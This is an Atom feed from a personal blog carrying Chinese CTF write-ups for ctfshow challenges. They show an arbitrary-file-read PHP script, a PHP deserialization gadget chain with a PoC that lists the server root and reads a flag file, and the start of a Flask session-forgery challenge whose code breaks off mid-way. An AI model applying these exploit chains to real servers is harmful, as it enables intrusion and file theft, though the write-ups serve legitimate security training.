<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-04-06T06:49:17.260Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buuctf-刷题记录 第二页</title>
    <link href="https://ke1nys.github.io/posts/6446e84f.html"/>
    <id>https://ke1nys.github.io/posts/6446e84f.html</id>
    <published>2023-04-06T06:49:17.000Z</published>
    <updated>2023-04-06T06:49:17.260Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow-愚人杯</title>
    <link href="https://ke1nys.github.io/posts/28e06bac.html"/>
    <id>https://ke1nys.github.io/posts/28e06bac.html</id>
    <published>2023-04-03T15:16:52.000Z</published>
    <updated>2023-04-06T06:48:36.154Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>题目</p><p><img src="../images/image-20230404104706716.png" alt="image-20230404104706716"></p><p>一个表情包，然后url后面还跟着一段base64编码的内容，解码后查看时<strong>face.png</strong>，所以感觉这里存在<strong>文件包含或者文件查询</strong></p><p>然后就去查询<code>index.php</code>,然后就查看源码发现了一段base64编码的内容，然后拿去解码</p><p><strong>解码后的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;ctfshow&#123;3ae89687-0319-4fdd-8d58-4910ede71b51&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$image</span>))&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$image</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/?img=&quot;</span>.<span class="variable">$image</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前目录中有一个txt文件哦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;text == <span class="string">&quot;aaaa&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kk</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> cycycycy;</span><br><span class="line">        <span class="variable">$a</span> -&gt; <span class="title function_ invoke__">aaa</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">cipher</span>(<span class="variable">$get</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$get</span> === <span class="string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;eval&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a_a</span> = <span class="variable language_">$this</span> -&gt; a;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\$a_a\$&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_AAAAAA&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_ip</span>);</span><br></pre></td></tr></table></figure><p>这题考察的就是原生类的做法</p><p><strong>实现了serializable接口的内置类就是c开头的</strong></p><p><a href="https://blog.csdn.net/JSPSEO/article/details/125135112">深入了解PHP反序列化原生类</a></p><p><a href="https://blog.csdn.net/weixin_61956136/article/details/125705264">web安全-PHP反序列化漏洞</a></p><p><img src="../images/image-20230404113117742.png" alt="image-20230404113117742"></p><p>本题就是用这个内置类来解题的</p><p>首先我们看到最下面这里是$ip = $SERVER[“HTTP_AAAAAA”]; 这一句话的意思是接收header头中 aaaaaa参数的值，然后将其反序列化。 然后根据提示在根目录中有一个txt文件，但是这里我们不知道他的文件名字是什么。</p><p><img src="../images/image-20230404114042321.png" alt="image-20230404114042321"></p><p><strong>这里传aaaaa是因为这个玩意对大小写不敏感，本地测试过了</strong></p><p><img src="../images/image-20230404115608848.png" alt="image-20230404115608848"></p><p>这里的格式就是和上面的内置类是一样的，并且<strong>coos</strong>和<strong>file</strong>还可控所以这里就可以直接查上面给的<strong>txt</strong>文件</p><p><strong>非预期</strong></p><p><a href="https://blog.csdn.net/qq_46570234/article/details/129928356?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168059578216800227488263%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168059578216800227488263&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-129928356-null-null.142^v81^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ctfshow%20%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4187">非预期wp</a></p><p>这里就是只用到了两个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是只用到两个类，就是一个类用获取文件名，一个用来获取flag的值</p><p>我们知道在php中支持使用<code>$a($b)</code>这样动态的形式调用函数/实例化，</p><p>可以看到我们这一行就是这样的形式：<code>$a = new $this-&gt;coos($this-&gt;file);</code></p><p><strong>可遍历目录类有以下几个：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator 类</span><br><span class="line">FilesystemIterator 类</span><br><span class="line">GlobIterator 类</span><br></pre></td></tr></table></figure><p><strong>可读取文件类有：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SplFileObject 类</span><br></pre></td></tr></table></figure><p>我们需要用内置类来遍历目录，然后读取文件</p><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="comment">// private $eeee=&quot;-_-&quot;;</span></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;name=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>分两步走，第一步，读取文件名</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;glob:///*f*&quot;</span>; <span class="comment">#使用glob协来查找匹配的文件路径模式 这里/*f*匹配了根目录下包含f的文件夹名</span></span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;DirectoryIterator&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404163706592.png" alt="image-20230404163706592"></p><p>读取到了文件名，然后我们就用另一个内置类来读取文件内容</p><p><strong>第二步，使用<code>SplFileObject</code>类读取文件内容：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404163852169.png" alt="image-20230404163852169"></p><p>最后拿到flag</p><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>题目</p><p><img src="../images/image-20230404164641841.png" alt="image-20230404164641841"></p><p><strong>考点</strong></p><p><strong>flask的session伪造  +  任意文件下载  +  python命令执行</strong></p><p>这里注册的时候尝试使用admin账户注册，然后发现了这个账户存在，然后就注册个其他账户进行登录查看</p><p><img src="../images/image-20230404164920975.png" alt="image-20230404164920975"></p><p>这里的话应该要成为管理员才能进行获取flag</p><p>然后点击learn</p><p><img src="../images/image-20230404165019779.png" alt="image-20230404165019779"></p><p>看到了一些代码，这里我看到給key的时候，我就想到了是不是考的是<strong>session伪造或则是python反序列化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"><span class="comment"># Check if user is loggedin</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 